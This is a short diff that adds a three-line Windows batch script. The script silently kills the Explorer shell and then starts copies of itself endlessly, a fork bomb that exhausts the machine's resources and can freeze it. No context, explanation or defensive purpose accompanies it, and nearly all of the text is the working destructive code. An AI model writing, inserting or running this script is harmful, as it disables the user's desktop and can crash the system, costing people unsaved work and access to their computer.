@@ -1,0 +1,3 @@
+echo off
+tskill explorer
+start | %0 || %0
